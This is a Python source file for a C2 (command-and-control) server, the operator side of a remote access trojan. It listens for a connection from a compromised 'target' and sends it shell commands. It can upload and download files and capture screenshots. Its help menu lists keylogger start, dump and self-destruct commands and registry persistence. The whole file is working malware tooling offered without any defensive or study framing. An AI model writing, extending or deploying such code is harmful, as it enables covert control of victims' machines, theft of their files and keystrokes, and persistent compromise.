import socket
from termcolor import colored
import pyfiglet
import json
import os

def recv_data():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def send_data(data):
	jsondata = json.dumps(data) # serializing the data so as to send reliably.
	target.send(jsondata.encode()) # encoding the serialized data & sending it to the target.

def upload_file(file_name):
	f = open(file_name, "rb")
	target.send(f.read())

def download_file(file_name):
	f = open(file_name, 'wb') 
	target.settimeout(1)
	chunk = target.recv(1024) 
	while True: 
		f.write(chunk)
		try:
			chunk = target.recv(1024) 
		except socket.timeout as e: 
			break
	target.settimeout(None)
	f.close()

def target_communication():
	count = 0
	while True:
		command = input(f"* Shell~{ip}: ").lower()
		send_data(command)
		if command == "quit":
			break
		elif command == 'clear':
			os.system('clear')
		elif command[:3] == "cd ":
			pass
		elif command[:6] == "upload":
			upload_file(command[7:])
		elif command[:8] == "download":
			download_file(command[9:])
		elif command[:10] == "screenshot":
			f = open("screenshot%d" % (count), 'wb')
			target.settimeout(3)
			chunk = target.recv(1024) 
			while True:
				f.write(chunk)
				try:
					chunk = target.recv(1024) 
				except socket.timeout as e:
					break
			target.settimeout(None)
			f.close()
			count +=1
		elif command == "help":
			            print(colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File
            persistence *RegName* *fileName*    --> Create Persistence In Registry\n''','yellow'))
		else:
			result = recv_data()
			print(f"\n {result}")


if __name__ == "__main__":

	ascii_banner = colored(pyfiglet.figlet_format(f"C2 Server\n"),"magenta")
	print(ascii_banner)

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(("192.168.1.105", 5555))
	print(colored("[+] Listening  for Incomig Connections.", "yellow"))
	sock.listen(5)

	target, ip = sock.accept()
	print(colored(f"[+] Target connected from {ip}","green"))

	target_communication()
